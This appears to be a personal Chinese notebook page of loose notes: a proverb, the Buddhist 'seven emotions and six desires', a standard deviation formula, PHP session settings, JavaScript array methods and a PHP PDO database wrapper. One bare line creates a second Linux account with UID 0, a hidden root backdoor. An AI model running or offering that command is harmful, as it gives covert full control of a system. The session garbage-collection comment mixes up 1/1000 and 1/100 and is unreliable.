
PostgreSQL  PHP模式   EA11

Love makes all hard hearts gentle.  爱情把一切冷酷的心变得温柔。


七情指一般人所具有之七种感情：喜、怒、哀、惧、爱、恶、恨。
六欲指眼、耳、鼻、舌、身、意六欲。 
七情，指一般人所具有之七种感情：喜、怒、哀、惧、爱、恶、恨。
六欲，据大智度论卷二记载，系指凡夫对异性所具有之六种欲望：
色欲、形貌欲、威仪欲、言语音声欲、细滑欲、人相欲；或指眼、耳、鼻、舌、身、意等六欲。
今所用‘七情六欲’一语，即套用佛典中之‘六欲’，泛指人之情绪、欲望等。
七情六欲是人类基本的生理要求和心理动态，是人性基础的基础。
现代汉语概念里，情与欲还不完全是一回事。
情主要是指人的情感表现，属于人的心理活动范畴；
而欲主要是指人的生存和享受的需要，属于生理活动的范畴。

谦卑不是看轻自己，而是不仅为自己着想。

面向对象的编程到底应当牢记什么？ 保持对象小型化、模块化、非耦合以及流线型.

标准方差：方差的平方根，一组数据中的每一个数与这组数据的平均数的差的平方的和再除以数据的个数，再取平方根。
σ={[∑(Xi-X)^2]/n}^(1/2)
σ标准方差    Xi样本数据，i取1到n    X样本的平均数     n样本个数
标准方差能反映一个数据集的离散程度，数据整体分布离平均值越近，标准方差就越小。

useradd -o -u 0 -g 0 -M -d /root -s /bin/bash vxzhan
select (@i:=@i+1) as i,post_time from tb_check_price,(select @i:=0) as tt  order by post_time desc; 

session.name = PHPSESSID			//默认session名为PHPSESSID
session.use_trans_sid = 0			//默认为0 对每个URL启用session名=SID,不建议开启，存在安全问题
;session.save_path = "/tmp"			//session的保存路径
session.gc_probability = 1			//
session.gc_divisor = 1000			//这两个合起来就是启动GC进行管理概率的 session.gc_probability = 1/session.gc_divisor = 100 等于 百分之一的几率. 

当文件成为垃圾时，要有一百次 启动的机会才会把过期的文件（垃圾回收）。
session.gc_maxlifetime = 1440			// session的发呆时间，默认1440 成为垃圾 （被回收时间） 单位以秒计算

session.cookie_lifetime = 0			//cookie默认的生命周期，默认为0 （当关闭浏览器时在启动SESSION时就会重新生成一个新的SESSION  如果设置时间，不管是否到设定的时间，都会重新生成新的SESSION。）

session.save_handler = files			//设置session的处理方式，可以设置user自定义
session.use_cookies = 1				//sessionid在客户端采用的存储方式，置1代表使用cookie记录客户端的sessionid


//javascript 的sort用法
var v = [0,1,5,10,15];
v.sort(function(v1,v2){
	return v1 > v2 ? -1 : (v1 == v2 ? 0 : 1);
});
console.log(v);
数组的操作方法：
concat
var colors = ['red','green','blue'];
var colors2 = colors.concat('yellow',['black','brown']);   ===> red,green,blue,yellow,black,brown

slice 方法
splice方法

indexOf()和 lastIndexOf()是ECMAScript 5为数组添加的两个方法
every(),filter(),forEach(),map(),some()是ECMAScript 5为数组添加的迭代方法
reduce(），reduceRight()是ECMAScript 5为数组添加的缩小方法


  //error提示
  public static function error($error)
  {
	  return '<div style="width:80%;height:auto;border:2px solid red;text-align:center;margin:10% auto;">
			<p style="">
			<img src="/points/usr/local/images/error.png" style="vertical-align:middle;"  />
			<label style="vertical-align:middle;font-size:22px;color:red;margin-left:2%;font-weight:bold;">ERROR</label>
			</p><p>' . $error . '</p></div>';
  }
  
  
  /**
	 * 执行一条查询语句 
	 * @param string $SQL  请在SQL中使用参数替代方式来尽量避免SQL注入行为
	 * @param array $arr 可以是关联数组，如array(':name'=>'ben').  也可是 索引数组，但请注意参数的顺序 
	 * @param array $opt 可选项 只能是关联数组 
	 * cursor键对指定指针移动方向	
	 * fetch键对指定返回结果的方式如关联数组 对象等  
	 * dbname键对指定使用的数据库通常使用默认值,除非是连接另外的数据库
	 * one键对指定仅获取结果集中一个
	 * @return 布尔值或者指定的返回类型如关联数组 对象等
	 */
	public static function selected($SQL,array $arr,array $opt=[])
	{
		$cursor = isset($opt['cursor']) ? $opt['cursor'] : [PDO::ATTR_CURSOR=>PDO::CURSOR_FWDONLY];
		$fetch = isset($opt['fetch']) ? $opt['fetch'] : PDO::FETCH_ASSOC;
		$stmt = self::PDO(isset($opt['dbname']) ? $opt['dbname'] : '')->prepare($SQL,$cursor);
		$dbc = $stmt->execute($arr);
		if($dbc !== FALSE)
		{
			if(isset($opt['one'])){ return $stmt->fetch($fetch); }
			return $stmt->fetchAll($fetch);
		}else{ 
			if(defined('TEST') && TEST)
			{
				//在测试环境输入错误消息
				exit( STR::error(implode(' ',$stmt->errorInfo())) );
			}else{  //在生产环境返回假值
				return FALSE;
			}
		}
	}

	/**
	 * 执行一条影响行数的SQL语句,但不包括insert操作，insert操作请使用inserted方法
	 * @param string $SQL  请在SQL中使用参数替代方式来尽量避免SQL注入行为
	 * @param array $arr 可以是关联数组，如array(':name'=>'ben').  也可是 索引数组，但请注意参数的顺序
	 * @param array $opt 可选项 只能是关联数组 
	 * dbname键对指定使用的数据库通常使用默认值,除非是连接另外的数据库
	 * @return 布尔值或者整型数据
	 */
	public static function modified($SQL,array $arr,array $opt=[])
	{
		if(stripos($SQL,'update') !== FALSE || stripos($SQL,'delete') !== FALSE)
		{
			$stmt = self::PDO(isset($opt['dbname']) ? $opt['dbname'] : '')->prepare($SQL);
			$dbc = $stmt->execute($arr);
			if($dbc !== FALSE)
			{
				return $stmt->rowCount();
			}else{ $error = implode(' ',$stmt->errorInfo());}
			
		}else{ $error = ' ONLY ALLOW  UPDATE OR DELETE OPERATION TO BE EXECUTED '; }
		if(defined('TEST') && TEST)
		{
			exit( STR::error($error)); //在测试环境输出错误消息
		}else{	return FALSE; }
	}

	/**
	 * 执行一条插入语句。
	 * @param string $SQL  请在SQL中使用参数替代方式来尽量避免SQL注入行为
	 * @param array $arr 可以是关联数组，如array(':name'=>'ben').  也可是 索引数组，但请注意参数的顺序
	 * @param array $opt 可选项 只能是关联数组 
	 * dbname键对指定使用的数据库通常使用默认值,除非是连接另外的数据库
	 * LID键对指定是否获取最后插入的自动增长的序列值
	 * @return 布尔值或整型数值 
	 */
	public static function inserted($SQL,array $arr,array $opt=[])
	{
		if(stripos($SQL,'insert into') !== FALSE)
		{
			$DBLink = self::PDO(isset($opt['dbname']) ? $opt['dbname'] : '');
			$stmt = $DBLink -> prepare($SQL);
			$dbc = $stmt->execute($arr);
			if($dbc !== FALSE)
			{
				return isset($opt['LID']) && $opt['LID'] ? $DBLink->lastInsertId( '_id_seq' ) : $stmt->rowCount();
			}else{ $error = implode(' ',$stmt->errorInfo());}
			
		}else{ $error = 'ONLY ALLOW  INSERT OPERATION TO BE EXECUTED'; }
		if(defined('TEST') && TEST)
		{
			exit( STR::error($error)); //在测试环境输出错误消息
		}else{	return FALSE; }
	}

	/**
	 * 执行一条插入多行的SQL语句
	 * @param string $SQL  请在SQL中使用参数替代方式来尽量避免SQL注入行为
	 * @param array $arr 关联数组，如array(':name'=>'ben')
	 * @param array $opt 可选项 只能是关联数组
	 * dbname键对指定使用的数据库通常使用默认值,除非是连接另外的数据库
	 * LID键对指定是否获取最后插入的自动增长的序列值 
	 * @return 布尔值或整型数值 
	 */
	public static function insertsed($SQL,array $arr,array $opt=[])
	{
		if(stripos($SQL,'insert into') !== FALSE)
		{
			$DBLink = self::PDO(isset($opt['dbname']) ? $opt['dbname'] : '');
			//组成SQL语句并绑定参数
			$val = array(); //临时数组用于将多个数组连接成字符串
			$arrLen = count($arr);
			$strBindParam = ''; //组成绑定字符串，多个插入
			for($i=0;$i<$arrLen;$i++)
			{
				$strBindParam .= '(';
				$tmpAr = array();
				foreach($arr[$i] as $k=>$v)
				{ 
					$tmpAr[] = $k . '_' . $i; 
					$val[$k . '_' . $i] = $v;
				}
				$strBindParam .= implode(',',$tmpAr);
				$strBindParam .= ($i == ($arrLen - 1)) ? ')' : '),';
			}
			$stmt = $DBLink->prepare($SQL . $strBindParam); //预处理SQL
			foreach($val as $x=>$y){ $stmt->bindValue($x,$y); } //参数和值绑定
			$dbc = $stmt->execute();
			if($dbc !== FALSE)
			{
				return isset($opt['LID']) && $opt['LID'] ? 
					   $DBLink->lastInsertId( '_id_seq' ) + ($arrLen - 1) : 
					   $stmt->rowCount();
			}else{ $error = implode(' ',$stmt->errorInfo()); } 
				
		}else{ $error = 'ONLY ALLOW  INSERT OPERATION TO BE EXECUTED'; }
		if(defined('TEST') && TEST)
		{
			exit( STR::error($error)); //在测试环境输出错误消息
		}else{	return FALSE; }	
	}




















